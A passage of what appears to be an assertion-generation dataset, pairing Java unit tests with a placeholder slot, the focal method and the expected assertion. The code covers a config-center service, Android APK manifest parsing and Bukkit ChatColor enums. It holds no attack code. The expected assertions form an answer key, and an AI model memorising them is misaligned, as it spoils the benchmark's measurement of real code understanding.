R.error(PRIV_MIS_STATUS, PRIV_MIS_MSG); } ConfigGroup configGroup = groupService.selectOneByExample(ConfigGroupExample.newBuilder() .build() .createCriteria() .andDeletedEqualTo(Deleted.OK.getValue()) .andVersionIdEqualTo(versionId) .andNameEqualTo(name) .toExample(), MetaConfigGroup.COLUMN_NAME_ID ); if (configGroup != null) { return R.error(GROUP_EXISTS_STATUS, GROUP_EXISTS_MSG); } ConfigGroup insert = new ConfigGroup(); insert.setUpdateTime(now); insert.setCreateTime(now); insert.setDeleted(Deleted.OK.getValue()); insert.setName(name); insert.setMemo(req.getMemo()); insert.setVersionId(versionId); insert.setEnvironmentId(version.getEnvironmentId()); insert.setProjectId(version.getProjectId()); insert.setProductId(version.getProductId()); groupService.insertSelective(insert); id = insert.getId(); } return R.ok(id); }"	assertEquals(NON_LOGIN_STATUS, result.getStatus())
"Exception { R result = healthCheckController.check(); Assert.""<AssertPlaceHolder>""; }
check() { return R.ok(); }"	assertEquals(OK, result.getStatus())
"Exception { when(productService.countByExample(any())).thenReturn(0L); when(projectService.countByExample(any())).thenReturn(0L); when(configItemService.countByExample(any())).thenReturn(0L); when(userService.countByExample(any())).thenReturn(0L);  R result = indexController.notice(); Assert.""<AssertPlaceHolder>""; }
notice() { // TODO 新增配置功能 Long productCnt = cache.getIfPresent(""productCnt""); if (productCnt == null) { productCnt = productService.countByExample(ProductExample.newBuilder().build()); cache.put(""productCnt"", productCnt); }  Long projectCnt = cache.getIfPresent(""projectCnt""); if (projectCnt == null) { projectCnt = projectService.countByExample(ProjectExample.newBuilder() .build() .createCriteria() .andDeletedEqualTo(Deleted.OK.getValue()) .toExample() ); cache.put(""projectCnt"", projectCnt); }  Long configItemCnt = cache.getIfPresent(""configItemCnt""); if (configItemCnt == null) { configItemCnt = configItemService.countByExample(ConfigItemExample.newBuilder() .build() .createCriteria() .andDeletedEqualTo(Deleted.OK.getValue()) .toExample() ); cache.put(""configItemCnt"", configItemCnt); }  Long userCnt = cache.getIfPresent(""userCnt""); if (userCnt == null) { userCnt = userService.countByExample(UserExample.newBuilder().build()); cache.put(""userCnt"", userCnt); } Map<String, Long> overview = new HashMap<String, Long>(); overview.put(""产品线数"", productCnt); overview.put(""工程数"", projectCnt); overview.put(""配置项数"", configItemCnt); overview.put(""用户数"", userCnt);  List<String> intro = new ArrayList<>(); intro.add(""配置中心统一管理应用的资源配置信息，多是K-V结构，如memcached、"" + ""db、redis等的配置，使配置信息不散落在各个项目，简化配置的维护；""); intro.add(""支持多环境、多版本资源的管理，可以在不改变应用源码的情况下无缝切换配置。""); intro.add(""配置服务的主要价值就是把系统各个环境，包括开发、"" + ""测试和线上的所有配置内容统一管理起来"");  Map<String, String> onDuty = new HashMap<>(); Map<String, String> manual = new HashMap<>();  NoticeVo noticeVo = NoticeVo.newBuilder() .overview(overview) .intro(intro) .onDuty(onDuty) .manual(manual) .build();  return R.ok(noticeVo); }"	assertEquals(OK, result.getStatus())
"Exception { R result = productController.saveProduct(new ProductReq(), null); Assert.""<AssertPlaceHolder>""; }
saveProduct(@RequestBody ProductReq req, @LoginUser User user) { if (user == null) { return R.error(NON_LOGIN_STATUS, NON_LOGIN_MSG); } Product product = new Product(); product.setId(req.getId()); product.setName(req.getName()); product.setMemo(req.getMemo()); Long id = productService.saveProduct(product, user); return R.ok(id); }"	assertEquals(NON_LOGIN_STATUS, result.getStatus())
"Exception { R<List<String>> result = productController.members(ID); Assert.""<AssertPlaceHolder>""; }
members(@PathVariable Long productId) { List<String> members = productUserService.selectByExample(ProductUserExample.newBuilder() .build() .createCriteria() .andProductIdEqualTo(productId) .toExample(), ProductUser :: getUserName, MetaProductUser.COLUMN_NAME_USERNAME ); return R.ok(members); }"	assertEquals(OK, result.getStatus())
"Exception { R<UserDto> result = userController.myProfile(adminLoginUser); Assert.""<AssertPlaceHolder>""; }
myProfile(@LoginUser User user) { if (user == null) { return R.error(NON_LOGIN_STATUS, NON_LOGIN_MSG); } UserDto userDto = new UserDto(); userDto.setUserId(user.getId()); userDto.setName(user.getName()); userDto.setRole(user.getRole()); userDto.setType(user.getType()); return R.ok(userDto); }"	assertEquals(0, result.getStatus())
"Exception { R<Long> result = versionController.saveVersion(new VersionReq(), null); Assert.""<AssertPlaceHolder>""; }
saveVersion(@RequestBody VersionReq req, @LoginUser User user) { if (user == null) { return R.error(NON_LOGIN_STATUS, NON_LOGIN_MSG); } Long id = req.getId(); String name = trim(req.getName()); if (NameUtils.containsChinese(name)) { return R.error(CHINESE_NOT_ALLOWED_STATUS, CHINESE_NOT_ALLOWED_MSG); } String memo = trim(req.getMemo()); Long cacheEvictEnvironmentId = null;  if (id != null && id > 0) { Version version = versionService.selectByPrimaryKey(id); if (version == null || Deleted.DELETE.getValue().equals(version.getDeleted())) { throw new BizException(VERSION_NOT_EXISTS_STATUS, VERSION_NOT_EXISTS_MSG); } // 修改 versionService.updateVersion(version, name, memo, user); cacheEvictEnvironmentId = version.getEnvironmentId(); } else { // 新增 Long environmentId = req.getEnvironmentId(); id = versionService.saveVersion(environmentId, name, memo, user); cacheEvictEnvironmentId = environmentId; } // 失效缓存 rccCache.evictVersion(cacheEvictEnvironmentId); return R.ok(id); }"	assertEquals(NON_LOGIN_STATUS, result.getStatus())
"Exception { VersionReq req = new VersionReq(); req.setId(ID); when(versionService.selectByPrimaryKey(any())).thenReturn(mock(Version.class)); R<Long> result = versionController.saveVersion(req, user); Assert.""<AssertPlaceHolder>""; }
saveVersion(@RequestBody VersionReq req, @LoginUser User user) { if (user == null) { return R.error(NON_LOGIN_STATUS, NON_LOGIN_MSG); } Long id = req.getId(); String name = trim(req.getName()); if (NameUtils.containsChinese(name)) { return R.error(CHINESE_NOT_ALLOWED_STATUS, CHINESE_NOT_ALLOWED_MSG); } String memo = trim(req.getMemo()); Long cacheEvictEnvironmentId = null;  if (id != null && id > 0) { Version version = versionService.selectByPrimaryKey(id); if (version == null || Deleted.DELETE.getValue().equals(version.getDeleted())) { throw new BizException(VERSION_NOT_EXISTS_STATUS, VERSION_NOT_EXISTS_MSG); } // 修改 versionService.updateVersion(version, name, memo, user); cacheEvictEnvironmentId = version.getEnvironmentId(); } else { // 新增 Long environmentId = req.getEnvironmentId(); id = versionService.saveVersion(environmentId, name, memo, user); cacheEvictEnvironmentId = environmentId; } // 失效缓存 rccCache.evictVersion(cacheEvictEnvironmentId); return R.ok(id); }"	assertEquals(OK, result.getStatus())
"Exception { R<List<VersionNodeVo>> result = versionController.myVersion(user, ID, ID); Assert.""<AssertPlaceHolder>""; }
myVersion( @LoginUser User user, @RequestParam(name = ""productId"", defaultValue = ""0"", required = false) Long productId, @RequestParam(name = ""projectId"", defaultValue = ""0"", required = false) Long projectId ) { return R.ok(versionService.myAllVersion(user, productId, projectId)); }"	assertEquals(OK, result.getStatus())
"Throwable { MethodInvocationProceedingJoinPoint joinPoint = mock(MethodInvocationProceedingJoinPoint.class); SaveLog saveLog = mock(SaveLog.class); String[] params = new String[] {""a"", ""b""}; int[] indexes = new int[]{0, 1}; when(saveLog.params()).thenReturn(params); when(saveLog.paramsIdxes()).thenReturn(indexes);   MaskLog[] maskLogs = new MaskLog[2];  MaskLog maskLog1 = mock(MaskLog.class); when(maskLog1.paramsIdx()).thenReturn(0); maskLogs[0] = maskLog1;  MaskLog maskLog2 = mock(MaskLog.class); when(maskLog2.paramsIdx()).thenReturn(1); when(maskLog2.fields()).thenReturn(new String[]{""password""}); maskLogs[1] = maskLog2;   when(saveLog.masks()).thenReturn(maskLogs);  Object[] args = new Object[2]; args[0] = 1L;  Map<String,String> map = new HashMap<>(); map.put(""user"", ""mark""); map.put(""password"", ""we4sdf12r""); args[1] = map; when(joinPoint.getArgs()).thenReturn(args);  MockHttpServletRequest request = new MockHttpServletRequest(); RequestContextHolder.setRequestAttributes(new ServletRequestAttributes(request)); Object result = webLogAspect.logBeforeController(joinPoint, saveLog); Assert.""<AssertPlaceHolder>""; }
logBeforeController(JoinPoint joinPoint, SaveLog saveLog) throws Throwable { Object result = null;  // 这个RequestContextHolder是Springmvc提供来获得请求的东西 RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes(); HttpServletRequest request = ((ServletRequestAttributes) requestAttributes).getRequest(); // 获取远程调用信息 String remoteAddress = request.getRemoteAddr() + "":"" + request.getRemotePort(); // 获取场景值 String scene = saveLog.scene(); // 掩码 saveLog Map<Integer, Set<String>> masks = maskMap(saveLog.masks()); // 获取操作用户 User user = UserThreadLocal.currentUser(); Long userId = user == null ? 0 : user.getId(); String operator = user == null ? """" : user.getName();  Object[] args = joinPoint.getArgs();  // 处理入参 String requestBody = """"; String[] params = saveLog.params(); int[] indexes = saveLog.paramsIdxes(); if (params != null && indexes != null && params.length == indexes.length) { Map<String, Object> reqMap = new HashMap<>(); for (int i = 0; i < indexes.length; i++) { int idx = indexes[i]; String reqName = params[i]; Object param = args[idx]; Set<String> fds = masks.get(idx); if (param == null) { reqMap.put(reqName, """"); } else if (param instanceof ServletRequest || param instanceof ServletResponse) { reqMap.put(reqName, """"); } else if (masks == null || !masks.containsKey(idx)) { reqMap.put(reqName, param); } else if (fds == null || fds.isEmpty()) { reqMap.put(reqName, ""***""); } else { String reqStr = GsonUtils.toJsonString(param); JsonObject jsonObject = GsonUtils.toJsonObject(reqStr); if (jsonObject == null) { reqMap.put(reqName, """"); continue; } for (String fd : fds) { jsonObject.addProperty(fd, ""***""); } reqMap.put(reqName, GsonUtils.toJsonString(jsonObject)); } } requestBody = GsonUtils.toJsonString(reqMap); }  try { MethodInvocationProceedingJoinPoint mjoinpoint = (MethodInvocationProceedingJoinPoint) joinPoint; result = mjoinpoint.proceed(args); String res = result == null ? """" : GsonUtils.toJsonString(result); operationLogService.saveLogWithBackground(userId, operator, scene, requestBody, res, remoteAddress); } catch (Throwable throwable) { throw throwable; } return result; }"	assertEquals(null, result)
"Exception { User u = mock(User.class); UserThreadLocal.setUser(u); Object result = loginUserHandlerMethodArgumentResolver.resolveArgument(null, null, null, null); Assert.""<AssertPlaceHolder>""; }
resolveArgument(MethodParameter methodParameter, ModelAndViewContainer modelAndViewContainer, NativeWebRequest nativeWebRequest, WebDataBinderFactory webDataBinderFactory) throws Exception { return UserThreadLocal.currentUser(); }"	assertEquals(u, result)
"Exception { FilterRegistrationBean result = webMvcConfig.crossDomainFilter(); Assert.""<AssertPlaceHolder>""; }
crossDomainFilter() { FilterRegistrationBean cross = new FilterRegistrationBean(); cross.setFilter(new CrossDomainFilter()); cross.setOrder(98); cross.addUrlPatterns(""/*""); return cross; }"	assertNotNull(result)
"Exception { FilterRegistrationBean result = webMvcConfig.uriCostFilterRegistration(); Assert.""<AssertPlaceHolder>""; }
uriCostFilterRegistration() { FilterRegistrationBean uriCostFilterBean = new FilterRegistrationBean(); uriCostFilterBean.setFilter(new UriCostFilter(brccInstanceService, projectService, productService)); uriCostFilterBean.setOrder(99); uriCostFilterBean.addUrlPatterns(""/*""); return uriCostFilterBean; }"	assertNotNull(result)
"Exception { UserExample result = userServiceImpl.newExample(); result.setStart(1); Assert.""<AssertPlaceHolder>""; }
newExample() { return UserExample.newBuilder().build(); }"	assertEquals(1, result.getStart().intValue())
"Exception { UserExample result = userServiceImpl.newIdInExample(Arrays.asList(Long.valueOf(1))); Assert.""<AssertPlaceHolder>""; }
newIdInExample(List<Long> ids) { return UserExample.newBuilder().build().createCriteria().andIdIn(ids).toExample(); }"	assertEquals(1, result.getOredCriteria().size())
"Exception { User result = userServiceImpl.selectUserByName(""name""); Assert.""<AssertPlaceHolder>""; }
selectUserByName(String name) { User user = selectOneByExample(UserExample.newBuilder() .build() .createCriteria() .andNameEqualTo(name) .toExample() ); return user; }"	assertEquals(null, result)
"Exception { User result = userServiceImpl.selectUserByToken(""token""); Assert.""<AssertPlaceHolder>""; }
selectUserByToken(String token) { User user = selectOneByExample(UserExample.newBuilder() .build() .createCriteria() .andTokenEqualTo(token) .toExample() ); return user; }"	assertEquals(null, result)
"Exception { User result = userServiceImpl.addUserIfNotExist(""name"", Byte.valueOf(""00110""), Byte.valueOf(""00110"")); Assert.""<AssertPlaceHolder>""; }
addUserIfNotExist(String name, Byte role, Byte userType) { name = trim(name); User user = selectUserByName(name);  // 用户不存在，直接添加 if (user == null) { Date curTime = new Date(); User userSave = User.newBuilder() .password(Md5Util.md5(Constants.DEFAULT_PASSWORD)) .createTime(curTime) .updateTime(curTime) .role(role) .name(name) .status((byte) 0) .type(userType) .token(UUID.randomUUID().toString()) .build();  insertSelective(userSave); return userSave; }  return user; }"	"assertEquals(""name"", result.getName())"
"Exception { List<Long> result = userServiceImpl.getProjectIdsByUserId(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getProjectIdsByUserId(Long userId) { List<Long> resIdList = new ArrayList<>(); // 获取projectUser表中的数据 List<Long> projectIdList = projectUserService.selectByExample( ProjectUserExample.newBuilder() .distinct(true) .build() .createCriteria() .andUserIdEqualTo(userId) .toExample(), ProjectUser :: getProjectId, MetaProjectUser.COLUMN_NAME_PROJECTID );  if (!CollectionUtils.isEmpty(projectIdList) && projectIdList.size() > Constants.MAX_PROJECT_NUM_PER_USER) { resIdList = projectIdList.subList(0, Constants.MAX_PROJECT_NUM_PER_USER - 1); } else { resIdList = projectIdList; }  return resIdList; }"	assertEquals(0, result.size())
"Exception { ConfigItemChangedCallable result = exampleConfiguration.configItemChangedCallable(); Assert.""<AssertPlaceHolder>""; }
configItemChangedCallable() { return new ItemCallback(); }"	assertEquals(DefaultConfigItemChangedCallable.class, result.getClass())
"Exception { String authUrl = ""abc""; R<AuthVo> vo = null; vo = httpClient.postJson(anyString(), any(), any(), anyMap(), anyMap()); String res = configLoader.login(); Assert.""<AssertPlaceHolder>"";       }
login() throws IOException { String authUrl = ccServerUrl.concat(AUTH_API); Map<String, String> body = new HashMap<>(); body.put(""projectName"", projectName); body.put(""apiPassword"", apiPassword); R<AuthVo> vo = this.httpClient.postJson(authUrl, AuthVo.class, GsonUtils.toJsonString(body), null, null); if (vo == null || vo.getData() == null || vo.getStatus() != 0) { String msg = null; if (vo == null) { msg = ""get rcc token fail.""; } else { msg = vo.getMsg(); } if (vo.getStatus() == 100204 && !enableInterruptService) { return null; } else { throw new RccException(msg); } } this.currentToken = vo.getData().getToken(); return this.currentToken; }"	assertEquals(null, res)
"Exception { // This file contains the lineage with the first two rsa-2048 signers SigningCertificateLineage lineage = Resources.toSigningCertificateLineage(getClass(), ""rsa-2048-lineage-2-signers""); SignerConfig unknownSigner = Resources.toLineageSignerConfig(getClass(), THIRD_RSA_2048_SIGNER_RESOURCE_NAME); ""<AssertPlaceHolder>""; }
isSignerInLineage(SignerConfig config) { if (config == null) { throw new NullPointerException(""config == null""); }  X509Certificate cert = config.getCertificate(); return isCertificateInLineage(cert); }"	"assertFalse(""The signer "" + unknownSigner.getCertificate().getSubjectDN() + "" should not be in the lineage"", lineage.isSignerInLineage(unknownSigner))"
"Exception { ByteBuffer manifest = getAndroidManifest(""original.apk""); ""<AssertPlaceHolder>""; }
getMinSdkVersionFromBinaryAndroidManifest( ByteBuffer androidManifestContents) throws MinSdkVersionException { // IMPLEMENTATION NOTE: Minimum supported Android platform version number is declared using // uses-sdk elements which are children of the top-level manifest element. uses-sdk element // declares the minimum supported platform version using the android:minSdkVersion attribute // whose default value is 1. // For each encountered uses-sdk element, the Android runtime checks that its minSdkVersion // is not higher than the runtime's API Level and rejects APKs if it is higher. Thus, the // effective minSdkVersion value is the maximum over the encountered minSdkVersion values.  try { // If no uses-sdk elements are encountered, Android accepts the APK. We treat this // scenario as though the minimum supported API Level is 1. int result = 1;  AndroidBinXmlParser parser = new AndroidBinXmlParser(androidManifestContents); int eventType = parser.getEventType(); while (eventType != AndroidBinXmlParser.EVENT_END_DOCUMENT) { if ((eventType == AndroidBinXmlParser.EVENT_START_ELEMENT) && (parser.getDepth() == 2) && (""uses-sdk"".equals(parser.getName())) && (parser.getNamespace().isEmpty())) { // In each uses-sdk element, minSdkVersion defaults to 1 int minSdkVersion = 1; for (int i = 0; i < parser.getAttributeCount(); i++) { if (parser.getAttributeNameResourceId(i) == MIN_SDK_VERSION_ATTR_ID) { int valueType = parser.getAttributeValueType(i); switch (valueType) { case AndroidBinXmlParser.VALUE_TYPE_INT: minSdkVersion = parser.getAttributeIntValue(i); break; case AndroidBinXmlParser.VALUE_TYPE_STRING: minSdkVersion = getMinSdkVersionForCodename( parser.getAttributeStringValue(i)); break; default: throw new MinSdkVersionException( ""Unable to determine APK's minimum supported Android"" + "": unsupported value type in "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME + ""'s"" + "" minSdkVersion"" + "". Only integer values supported.""); } break; } } result = Math.max(result, minSdkVersion); } eventType = parser.next(); }  return result; } catch (AndroidBinXmlParser.XmlParserException e) { throw new MinSdkVersionException( ""Unable to determine APK's minimum supported Android platform version"" + "": malformed binary resource: "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME, e); } }"	assertEquals(23, ApkUtils.getMinSdkVersionFromBinaryAndroidManifest(manifest))
"Exception { ByteBuffer manifest = getAndroidManifest(""original.apk""); ""<AssertPlaceHolder>""; }
getPackageNameFromBinaryAndroidManifest( ByteBuffer androidManifestContents) throws ApkFormatException { // IMPLEMENTATION NOTE: Package name is declared as the ""package"" attribute of the top-level // manifest element. Interestingly, as opposed to most other attributes, Android Package // Manager looks up this attribute by its name rather than by its resource ID.  try { AndroidBinXmlParser parser = new AndroidBinXmlParser(androidManifestContents); int eventType = parser.getEventType(); while (eventType != AndroidBinXmlParser.EVENT_END_DOCUMENT) { if ((eventType == AndroidBinXmlParser.EVENT_START_ELEMENT) && (parser.getDepth() == 1) && (""manifest"".equals(parser.getName())) && (parser.getNamespace().isEmpty())) { for (int i = 0; i < parser.getAttributeCount(); i++) { if (""package"".equals(parser.getAttributeName(i)) && (parser.getNamespace().isEmpty())) { return parser.getAttributeStringValue(i); } } // No ""package"" attribute found return null; } eventType = parser.next(); }  // No manifest element found return null; } catch (AndroidBinXmlParser.XmlParserException e) { throw new ApkFormatException( ""Unable to determine APK package name: malformed binary resource: "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME, e); } }"	"assertEquals( ""android.appsecurity.cts.tinyapp"", ApkUtils.getPackageNameFromBinaryAndroidManifest(manifest))"
"Exception { ByteBuffer manifest = getAndroidManifest(""v3-ec-p256-targetSdk-30.apk""); ""<AssertPlaceHolder>""; }
getTargetSdkVersionFromBinaryAndroidManifest( ByteBuffer androidManifestContents) { // If the targetSdkVersion is not specified then the platform will use the value of the // minSdkVersion; if neither is specified then the platform will use a value of 1. int minSdkVersion = 1; try { return getAttributeValueFromBinaryAndroidManifest(androidManifestContents, USES_SDK_ELEMENT_TAG, TARGET_SDK_VERSION_ATTR_ID); } catch (ApkFormatException e) { // Expected if the APK does not contain a targetSdkVersion attribute or the uses-sdk // element is not specified at all. } androidManifestContents.rewind(); try { minSdkVersion = getMinSdkVersionFromBinaryAndroidManifest(androidManifestContents); } catch (ApkFormatException e) { // Similar to above, expected if the APK does not contain a minSdkVersion attribute, or // the uses-sdk element is not specified at all. } return minSdkVersion; }"	assertEquals(30, ApkUtils.getTargetSdkVersionFromBinaryAndroidManifest(manifest))
"Exception { ByteBuffer manifest = getAndroidManifest(""v1-only-no-uses-sdk.apk""); ""<AssertPlaceHolder>""; }
getTargetSdkVersionFromBinaryAndroidManifest( ByteBuffer androidManifestContents) { // If the targetSdkVersion is not specified then the platform will use the value of the // minSdkVersion; if neither is specified then the platform will use a value of 1. int minSdkVersion = 1; try { return getAttributeValueFromBinaryAndroidManifest(androidManifestContents, USES_SDK_ELEMENT_TAG, TARGET_SDK_VERSION_ATTR_ID); } catch (ApkFormatException e) { // Expected if the APK does not contain a targetSdkVersion attribute or the uses-sdk // element is not specified at all. } androidManifestContents.rewind(); try { minSdkVersion = getMinSdkVersionFromBinaryAndroidManifest(androidManifestContents); } catch (ApkFormatException e) { // Similar to above, expected if the APK does not contain a minSdkVersion attribute, or // the uses-sdk element is not specified at all. } return minSdkVersion; }"	assertEquals(1, ApkUtils.getTargetSdkVersionFromBinaryAndroidManifest(manifest))
"Exception { ByteBuffer manifest = getAndroidManifest(""targetSandboxVersion-2.apk""); ""<AssertPlaceHolder>""; }
getTargetSandboxVersionFromBinaryAndroidManifest( ByteBuffer androidManifestContents) { try { return getAttributeValueFromBinaryAndroidManifest(androidManifestContents, MANIFEST_ELEMENT_TAG, TARGET_SANDBOX_VERSION_ATTR_ID); } catch (ApkFormatException e) { // An ApkFormatException indicates the target sandbox is not specified in the manifest; // return a default value of 1. return 1; } }"	assertEquals(2, ApkUtils.getTargetSandboxVersionFromBinaryAndroidManifest(manifest))
"Exception { ByteBuffer manifest = getAndroidManifest(""original.apk""); ""<AssertPlaceHolder>""; }
getVersionCodeFromBinaryAndroidManifest(ByteBuffer androidManifestContents) throws ApkFormatException { return getAttributeValueFromBinaryAndroidManifest(androidManifestContents, MANIFEST_ELEMENT_TAG, VERSION_CODE_ATTR_ID); }"	assertEquals(10, ApkUtils.getVersionCodeFromBinaryAndroidManifest(manifest))
"Exception { ByteBuffer manifest = getAndroidManifest(""original-with-versionCodeMajor.apk""); ""<AssertPlaceHolder>""; }
getVersionCodeFromBinaryAndroidManifest(ByteBuffer androidManifestContents) throws ApkFormatException { return getAttributeValueFromBinaryAndroidManifest(androidManifestContents, MANIFEST_ELEMENT_TAG, VERSION_CODE_ATTR_ID); }"	assertEquals(25, ApkUtils.getVersionCodeFromBinaryAndroidManifest(manifest))
"Exception { ByteBuffer manifest = getAndroidManifest(""original-with-versionCodeMajor.apk""); ""<AssertPlaceHolder>""; }
getLongVersionCodeFromBinaryAndroidManifest( ByteBuffer androidManifestContents) throws ApkFormatException { // If the versionCode is not found then allow the ApkFormatException to be thrown to notify // the caller that the versionCode is not available. int versionCode = getVersionCodeFromBinaryAndroidManifest(androidManifestContents); long versionCodeMajor = 0; try { androidManifestContents.rewind(); versionCodeMajor = getAttributeValueFromBinaryAndroidManifest(androidManifestContents, MANIFEST_ELEMENT_TAG, VERSION_CODE_MAJOR_ATTR_ID); } catch (ApkFormatException e) { // This is expected if the versionCodeMajor has not been defined for the APK; in this // case the return value is just the versionCode. } return (versionCodeMajor << 32) | versionCode; }"	assertEquals(4294967321L, ApkUtils.getLongVersionCodeFromBinaryAndroidManifest(manifest))
"Exception { ByteBuffer manifest = getAndroidManifest(""original.apk""); MessageDigest md = MessageDigest.getInstance(""SHA-256""); md.update(manifest); byte[] actualDigest = md.digest(); ""<AssertPlaceHolder>""; }
getAndroidManifest(DataSource apk) throws IOException, ApkFormatException { ZipSections zipSections; try { zipSections = findZipSections(apk); } catch (ZipFormatException e) { throw new ApkFormatException(""Not a valid ZIP archive"", e); } List<CentralDirectoryRecord> cdRecords = V1SchemeVerifier.parseZipCentralDirectory(apk, zipSections); CentralDirectoryRecord androidManifestCdRecord = null; for (CentralDirectoryRecord cdRecord : cdRecords) { if (ANDROID_MANIFEST_ZIP_ENTRY_NAME.equals(cdRecord.getName())) { androidManifestCdRecord = cdRecord; break; } } if (androidManifestCdRecord == null) { throw new ApkFormatException(""Missing "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME); } DataSource lfhSection = apk.slice(0, zipSections.getZipCentralDirectoryOffset());  try { return ByteBuffer.wrap( LocalFileRecord.getUncompressedData( lfhSection, androidManifestCdRecord, lfhSection.size())); } catch (ZipFormatException e) { throw new ApkFormatException(""Failed to read "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME, e); } }"	"assertEquals( ""8b3de63a282652221162cdc327f424924ac3c7c24e642035975a1ee7a395c4dc"", HexEncoding.encode(actualDigest))"
"Exception { byte[] fullFileContent = createFileContent(1024 * 1024 + 987654); RandomAccessFile raf = createRaf(fullFileContent); DataSource rafDataSource = new FileChannelDataSource(raf.getChannel());  ByteArrayDataSink dataSink = new ByteArrayDataSink();  int bytesToFeed = 1024 * 1024 + 12345; rafDataSource.feed(0, bytesToFeed, dataSink);  byte[] expectedBytes = Arrays.copyOf(fullFileContent, bytesToFeed);  byte[] resultBytes = getDataSinkBytes(dataSink);  ""<AssertPlaceHolder>""; }
feed(long offset, long size, DataSink sink) throws IOException { long sourceSize = size(); checkChunkValid(offset, size, sourceSize); if (size == 0) { return; }  long chunkOffsetInFile = mOffset + offset; long remaining = size; ByteBuffer buf = ByteBuffer.allocateDirect((int) Math.min(remaining, MAX_READ_CHUNK_SIZE));  while (remaining > 0) { int chunkSize = (int) Math.min(remaining, buf.capacity()); int chunkRemaining = chunkSize; buf.limit(chunkSize); synchronized (mChannel) { mChannel.position(chunkOffsetInFile); while (chunkRemaining > 0) { int read = mChannel.read(buf); if (read < 0) { throw new IOException(""Unexpected EOF encountered""); } chunkRemaining -= read; } } buf.flip(); sink.consume(buf); buf.clear(); chunkOffsetInFile += chunkSize; remaining -= chunkSize; } }"	assertArrayEquals(expectedBytes, resultBytes)
"Exception { byte[] fullFileContent = createFileContent(1024 * 1024 + 987654); RandomAccessFile raf = createRaf(fullFileContent); DataSource rafDataSource = new FileChannelDataSource(raf.getChannel());  ByteArrayDataSink dataSink = new ByteArrayDataSink();  int offset = 23456; int bytesToFeed = 1024 * 1024 + 12345; rafDataSource.feed(offset, bytesToFeed, dataSink);  byte[] expectedBytes = Arrays.copyOfRange(fullFileContent, offset, offset + bytesToFeed);  byte[] resultBytes = getDataSinkBytes(dataSink);  ""<AssertPlaceHolder>""; }
feed(long offset, long size, DataSink sink) throws IOException { long sourceSize = size(); checkChunkValid(offset, size, sourceSize); if (size == 0) { return; }  long chunkOffsetInFile = mOffset + offset; long remaining = size; ByteBuffer buf = ByteBuffer.allocateDirect((int) Math.min(remaining, MAX_READ_CHUNK_SIZE));  while (remaining > 0) { int chunkSize = (int) Math.min(remaining, buf.capacity()); int chunkRemaining = chunkSize; buf.limit(chunkSize); synchronized (mChannel) { mChannel.position(chunkOffsetInFile); while (chunkRemaining > 0) { int read = mChannel.read(buf); if (read < 0) { throw new IOException(""Unexpected EOF encountered""); } chunkRemaining -= read; } } buf.flip(); sink.consume(buf); buf.clear(); chunkOffsetInFile += chunkSize; remaining -= chunkSize; } }"	assertArrayEquals(expectedBytes, resultBytes)
"Exception { byte[] fullFileContent = createFileContent(3 * 1024 * 1024 + 987654); RandomAccessFile raf = createRaf(fullFileContent); DataSource rafDataSource = new FileChannelDataSource(raf.getChannel());  ByteArrayDataSink dataSink = new ByteArrayDataSink();  int offset = 23456; int bytesToFeed = 2 * 1024 * 1024 + 12345; rafDataSource.feed(offset, bytesToFeed, dataSink);  byte[] expectedBytes = Arrays.copyOfRange(fullFileContent, offset, offset + bytesToFeed);  byte[] resultBytes = getDataSinkBytes(dataSink);  ""<AssertPlaceHolder>""; }
feed(long offset, long size, DataSink sink) throws IOException { long sourceSize = size(); checkChunkValid(offset, size, sourceSize); if (size == 0) { return; }  long chunkOffsetInFile = mOffset + offset; long remaining = size; ByteBuffer buf = ByteBuffer.allocateDirect((int) Math.min(remaining, MAX_READ_CHUNK_SIZE));  while (remaining > 0) { int chunkSize = (int) Math.min(remaining, buf.capacity()); int chunkRemaining = chunkSize; buf.limit(chunkSize); synchronized (mChannel) { mChannel.position(chunkOffsetInFile); while (chunkRemaining > 0) { int read = mChannel.read(buf); if (read < 0) { throw new IOException(""Unexpected EOF encountered""); } chunkRemaining -= read; } } buf.flip(); sink.consume(buf); buf.clear(); chunkOffsetInFile += chunkSize; remaining -= chunkSize; } }"	assertArrayEquals(expectedBytes, resultBytes)
"Exception { // This test verifies the generateCertificates method returns an empty Collection of // Certificates when provided an empty InputStream. ""<AssertPlaceHolder>""; }
generateCertificates( InputStream in) throws CertificateException { if (sCertFactory == null) { buildCertFactory(); } return generateCertificates(in, sCertFactory); }"	"assertEquals( ""Zero certificates should be returned when passing an empty InputStream to "" + ""generateCertificates"", 0, X509CertificateUtils.generateCertificates( new ByteArrayInputStream(new byte[0])).size())"
"getById() { for (Art art : Art.values()) { ""<AssertPlaceHolder>""; } }
getId() { return id; }"	assertThat(Art.getById(art.getId()), is(art))
"getByName() { for (Art art : Art.values()) { ""<AssertPlaceHolder>""; } }
getByName(String name) { Validate.notNull(name, ""Name cannot be null"");  return BY_NAME.get(name.toLowerCase().replaceAll(""_"", """")); }"	assertThat(Art.getByName(art.toString()), is(art))
"getByNameWithMixedCase() { Art subject = Art.values()[0]; String name = subject.toString().replace('E', 'e');  ""<AssertPlaceHolder>""; }
getByName(String name) { Validate.notNull(name, ""Name cannot be null"");  return BY_NAME.get(name.toLowerCase().replaceAll(""_"", """")); }"	assertThat(Art.getByName(name), is(subject))
"getByChar() { for (ChatColor color : ChatColor.values()) { ""<AssertPlaceHolder>""; } }
getChar() { return code; }"	assertThat(ChatColor.getByChar(color.getChar()), is(color))
"getByNull() { ""<AssertPlaceHolder>""; }
stripColor(final String input) { if (input == null) { return null; }  return STRIP_COLOR_PATTERN.matcher(input).replaceAll(""""); }"	assertThat(ChatColor.stripColor(null), is(nullValue()))
"getByString() { for (ChatColor color : ChatColor.values()) { ""<AssertPlaceHolder>""; } }
getChar() { return code; }"	assertThat(ChatColor.getByChar(String.valueOf(color.getChar())), is(color))
"stripColorOnNullString() { ""<AssertPlaceHolder>""; }
stripColor(final String input) { if (input == null) { return null; }  return STRIP_COLOR_PATTERN.matcher(input).replaceAll(""""); }"	assertThat(ChatColor.stripColor(null), is(nullValue()))
"stripColor() { StringBuilder subject = new StringBuilder(); StringBuilder expected = new StringBuilder();  final String filler = ""test""; for (ChatColor color : ChatColor.values()) { subject.append(color).append(filler); expected.append(filler); }  ""<AssertPlaceHolder>""; }
toString() { return toString; }"	assertThat(ChatColor.stripColor(subject.toString()), is(expected.toString()))
